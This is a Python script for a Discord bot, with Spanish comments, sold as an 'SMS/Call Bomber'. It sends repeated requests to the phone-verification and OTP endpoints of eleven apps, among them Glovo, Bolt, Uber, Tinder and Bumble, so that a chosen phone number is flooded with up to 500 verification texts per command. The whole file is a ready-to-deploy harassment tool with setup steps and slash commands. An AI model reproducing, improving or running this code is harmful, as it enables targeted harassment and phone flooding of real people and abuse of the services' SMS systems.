#!/usr/bin/env python3
"""
Discord SMS/Call Bomber Bot
Usa desde movil o PC con comandos de Discord

INSTRUCCIONES:
1. Ve a https://discord.com/developers/applications
2. Crea una aplicacion nueva
3. Ve a "Bot" -> "Add Bot"
4. Copia el TOKEN y pegalo abajo donde dice TU_TOKEN_AQUI
5. En "Bot" activa: MESSAGE CONTENT INTENT, SERVER MEMBERS INTENT
6. Ve a OAuth2 -> URL Generator -> marca "bot" y "applications.commands"
7. En permisos marca: Send Messages, Read Messages, Use Slash Commands
8. Copia la URL y abrela para invitar el bot a tu servidor
9. Ejecuta este script: python discord_bomber_bot.py
"""

import discord
from discord.ext import commands
from discord import app_commands
import requests
import asyncio
import threading
import uuid
import json
import os
import urllib3
urllib3.disable_warnings()

# =====================================================
#   TOKEN DE DISCORD
#   Configura la variable de entorno DISCORD_TOKEN
#   En Railway: Variables -> DISCORD_TOKEN = tu_token
# =====================================================
TOKEN = os.environ.get("DISCORD_TOKEN")
if not TOKEN:
    print("ERROR: Configura la variable DISCORD_TOKEN")
    exit(1)
# =====================================================

intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix="!", intents=intents)

class SMSBomber:
    def __init__(self):
        self.results = {"success": 0, "failed": 0}

    def reset(self):
        self.results = {"success": 0, "failed": 0}

    def generate_uuid(self):
        return str(uuid.uuid4())

    # ========== API GLOVO (REAL - Capturada) ==========
    async def glovo(self, phone):
        try:
            url = "https://api.glovoapp.com/v0/identity/flow/start_verification"
            headers = {
                "Content-Type": "application/json",
                "Glovo-App-Platform": "web",
                "Glovo-App-Type": "customer",
                "Glovo-Api-Version": "14",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
            }
            data = {
                "identityValue": {"phoneNumber": phone},
                "identityType": "PHONE_NUMBER",
                "identityMetadata": {"selectedVerificationMethod": "SMS"}
            }
            resp = requests.post(url, headers=headers, json=data, timeout=15, verify=False)
            if resp.status_code in [200, 201, 202]:
                self.results["success"] += 1
                return True
        except:
            pass
        self.results["failed"] += 1
        return False

    # ========== API BOLT (REAL - Capturada con 2 pasos) ==========
    async def bolt(self, phone):
        try:
            # PASO 1: startRegistration - obtener token
            url1 = "https://driverregistration.live.boltsvc.net/driverRegistration/startRegistration"
            params = {
                "version": "HP.24.33",
                "device_name": "HP",
                "device_os_version": "web",
                "deviceId": "web",
                "deviceType": "web",
                "language": "es-es"
            }
            headers1 = {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "application/json",
                "Origin": "https://bolt.eu",
                "Referer": "https://bolt.eu/"
            }
            data1 = {
                "email": f"test{self.generate_uuid()[:8]}@gmail.com",
                "phone": phone,
                "city_id": 1617,
                "terms_consent_accepted": 1
            }
            resp1 = requests.post(url1, params=params, headers=headers1, json=data1, timeout=15, verify=False)
            if resp1.status_code != 200:
                self.results["failed"] += 1
                return False

            resp1_json = resp1.json()
            if resp1_json.get("code") != 0:
                self.results["failed"] += 1
                return False

            token = resp1_json["data"]["token"]

            # PASO 2: startVerification - enviar SMS
            url2 = "https://driverregistration.live.boltsvc.net/driverRegistration/startVerification?brand=bolt"
            headers2 = {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "application/json",
                "Origin": "https://signup.bolt.eu",
                "Referer": "https://signup.bolt.eu/"
            }
            data2 = {
                "token": token,
                "verification_code_channel": "sms",
                "device_os_version": "web",
                "device_name": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "deviceId": self.generate_uuid(),
                "device_type": "web",
                "version": "DR.3.90",
                "language": "es-es",
                "visitor_id": f"visitor-driver-{self.generate_uuid()}"
            }
            resp2 = requests.post(url2, headers=headers2, json=data2, timeout=15, verify=False)
            if resp2.status_code == 200:
                resp2_json = resp2.json()
                if resp2_json.get("code") == 0:
                    self.results["success"] += 1
                    return True
        except:
            pass
        self.results["failed"] += 1
        return False

    # ========== API CABIFY ==========
    async def cabify(self, phone):
        try:
            url = "https://api.cabify.com/auth/mobile/v3/request-otp"
            headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
            data = {"phone_number": phone, "country_code": "ES"}
            resp = requests.post(url, headers=headers, json=data, timeout=15, verify=False)
            if resp.status_code in [200, 201, 202]:
                self.results["success"] += 1
                return True
        except:
            pass
        self.results["failed"] += 1
        return False

    # ========== API UBER ==========
    async def uber(self, phone):
        try:
            url = "https://cn-geo1.uber.com/rt/silk-screen/sign-up/phone"
            headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
            data = {"phoneNumber": phone}
            resp = requests.post(url, headers=headers, json=data, timeout=15, verify=False)
            if resp.status_code in [200, 201, 202]:
                self.results["success"] += 1
                return True
        except:
            pass
        self.results["failed"] += 1
        return False

    # ========== API WALLAPOP ==========
    async def wallapop(self, phone):
        try:
            url = "https://api.wallapop.com/api/v3/users/request-phone-token"
            headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
            data = {"phone_number": phone}
            resp = requests.post(url, headers=headers, json=data, timeout=15, verify=False)
            if resp.status_code in [200, 201, 202]:
                self.results["success"] += 1
                return True
        except:
            pass
        self.results["failed"] += 1
        return False

    # ========== API TINDER ==========
    async def tinder(self, phone):
        try:
            url = "https://api.gotinder.com/v2/auth/sms/send"
            headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0", "app-version": "1000000"}
            data = {"phone_number": phone}
            resp = requests.post(url, headers=headers, json=data, timeout=15, verify=False)
            if resp.status_code in [200, 201, 202]:
                self.results["success"] += 1
                return True
        except:
            pass
        self.results["failed"] += 1
        return False

    # ========== API VINTED ==========
    async def vinted(self, phone):
        try:
            url = "https://www.vinted.es/api/v2/phone_verification/send_code"
            headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
            data = {"phone_number": phone}
            resp = requests.post(url, headers=headers, json=data, timeout=15, verify=False)
            if resp.status_code in [200, 201, 202]:
                self.results["success"] += 1
                return True
        except:
            pass
        self.results["failed"] += 1
        return False

    # ========== API GETIR ==========
    async def getir(self, phone):
        try:
            url = "https://api.getir.com/auth/phone/verify"
            headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
            data = {"phoneNumber": phone, "countryCode": "+34"}
            resp = requests.post(url, headers=headers, json=data, timeout=15, verify=False)
            if resp.status_code in [200, 201, 202]:
                self.results["success"] += 1
                return True
        except:
            pass
        self.results["failed"] += 1
        return False

    # ========== API DELIVEROO ==========
    async def deliveroo(self, phone):
        try:
            url = "https://api.deliveroo.com/orderapp/v1/auth/phone"
            headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
            data = {"phone": phone, "country_code": "ES"}
            resp = requests.post(url, headers=headers, json=data, timeout=15, verify=False)
            if resp.status_code in [200, 201, 202]:
                self.results["success"] += 1
                return True
        except:
            pass
        self.results["failed"] += 1
        return False

    # ========== API JUST EAT ==========
    async def justeat(self, phone):
        try:
            url = "https://es.just-eat.es/api/auth/request-verification"
            headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
            data = {"phoneNumber": phone, "type": "sms"}
            resp = requests.post(url, headers=headers, json=data, timeout=15, verify=False)
            if resp.status_code in [200, 201, 202]:
                self.results["success"] += 1
                return True
        except:
            pass
        self.results["failed"] += 1
        return False

    # ========== API BUMBLE ==========
    async def bumble(self, phone):
        try:
            url = "https://api.bumble.com/mwebapi.pyi"
            headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
            data = {"body": [{"message_type": 102, "server_request_phone_number": {"phone": phone}}], "message_type": 102}
            resp = requests.post(url, headers=headers, json=data, timeout=15, verify=False)
            if resp.status_code in [200, 201, 202]:
                self.results["success"] += 1
                return True
        except:
            pass
        self.results["failed"] += 1
        return False

    def get_services(self):
        return [
            ("Glovo", self.glovo),
            ("Bolt", self.bolt),
            ("Cabify", self.cabify),
            ("Uber", self.uber),
            ("Wallapop", self.wallapop),
            ("Tinder", self.tinder),
            ("Vinted", self.vinted),
            ("Getir", self.getir),
            ("Deliveroo", self.deliveroo),
            ("JustEat", self.justeat),
            ("Bumble", self.bumble),
        ]

bomber = SMSBomber()

@bot.event
async def on_ready():
    print(f"="*50)
    print(f"  BOT CONECTADO: {bot.user}")
    print(f"  Servidores: {len(bot.guilds)}")
    print(f"="*50)
    try:
        synced = await bot.tree.sync()
        print(f"  Comandos sincronizados: {len(synced)}")
    except Exception as e:
        print(f"  Error sync: {e}")

@bot.tree.command(name="bomb", description="Enviar SMS bomb a un numero")
@app_commands.describe(phone="Numero con codigo de pais (+34...)", count="Cantidad de SMS")
async def bomb_command(interaction: discord.Interaction, phone: str, count: int = 50):
    if not phone.startswith("+"):
        phone = "+34" + phone

    if count > 500:
        count = 500

    bomber.reset()
    services = bomber.get_services()

    await interaction.response.send_message(
        f"```\n"
        f"SMS BOMBER INICIADO\n"
        f"{'='*30}\n"
        f"Target: {phone}\n"
        f"Cantidad: {count}\n"
        f"Servicios: {len(services)}\n"
        f"{'='*30}\n"
        f"Enviando...\n"
        f"```"
    )

    for i in range(count):
        name, service = services[i % len(services)]
        await service(phone)

        if (i + 1) % 10 == 0:
            await interaction.edit_original_response(content=
                f"```\n"
                f"SMS BOMBER EN PROGRESO\n"
                f"{'='*30}\n"
                f"Target: {phone}\n"
                f"Progreso: {i+1}/{count}\n"
                f"Exitosos: {bomber.results['success']}\n"
                f"Fallidos: {bomber.results['failed']}\n"
                f"{'='*30}\n"
                f"```"
            )
        await asyncio.sleep(0.2)

    await interaction.edit_original_response(content=
        f"```\n"
        f"SMS BOMBER COMPLETADO\n"
        f"{'='*30}\n"
        f"Target: {phone}\n"
        f"Total enviados: {count}\n"
        f"Exitosos: {bomber.results['success']}\n"
        f"Fallidos: {bomber.results['failed']}\n"
        f"{'='*30}\n"
        f"```"
    )

@bot.tree.command(name="services", description="Ver servicios disponibles")
async def services_command(interaction: discord.Interaction):
    services = bomber.get_services()
    service_list = "\n".join([f"  - {name}" for name, _ in services])

    await interaction.response.send_message(
        f"```\n"
        f"SERVICIOS DISPONIBLES ({len(services)})\n"
        f"{'='*30}\n"
        f"{service_list}\n"
        f"{'='*30}\n"
        f"Uso: /bomb +34XXXXXXXXX 50\n"
        f"```"
    )

@bot.tree.command(name="help", description="Ver comandos disponibles")
async def help_command(interaction: discord.Interaction):
    await interaction.response.send_message(
        f"```\n"
        f"SMS BOMBER BOT - COMANDOS\n"
        f"{'='*35}\n"
        f"/bomb <numero> <cantidad>\n"
        f"   Enviar SMS al numero\n"
        f"   Ejemplo: /bomb +34612345678 100\n"
        f"\n"
        f"/services\n"
        f"   Ver servicios disponibles\n"
        f"\n"
        f"/help\n"
        f"   Ver esta ayuda\n"
        f"{'='*35}\n"
        f"```"
    )

# Comando con prefijo ! tambien
@bot.command(name="bomb")
async def bomb_prefix(ctx, phone: str, count: int = 50):
    if not phone.startswith("+"):
        phone = "+34" + phone

    if count > 500:
        count = 500

    bomber.reset()
    services = bomber.get_services()

    msg = await ctx.send(
        f"```\n"
        f"SMS BOMBER INICIADO\n"
        f"Target: {phone} | Cantidad: {count}\n"
        f"```"
    )

    for i in range(count):
        name, service = services[i % len(services)]
        await service(phone)
        await asyncio.sleep(0.2)

    await msg.edit(content=
        f"```\n"
        f"SMS BOMBER COMPLETADO\n"
        f"{'='*30}\n"
        f"Target: {phone}\n"
        f"Exitosos: {bomber.results['success']}\n"
        f"Fallidos: {bomber.results['failed']}\n"
        f"{'='*30}\n"
        f"```"
    )

if __name__ == "__main__":
    if TOKEN == "TU_TOKEN_AQUI":
        print("\n" + "="*50)
        print("  ERROR: Necesitas poner tu token de Discord!")
        print("="*50)
        print("\n  1. Ve a https://discord.com/developers/applications")
        print("  2. Crea una aplicacion")
        print("  3. Ve a 'Bot' -> 'Reset Token' -> Copia el token")
        print("  4. Pega el token en este archivo donde dice TU_TOKEN_AQUI")
        print("  5. Ejecuta de nuevo\n")
    else:
        print("\nIniciando bot...")
        bot.run(TOKEN)
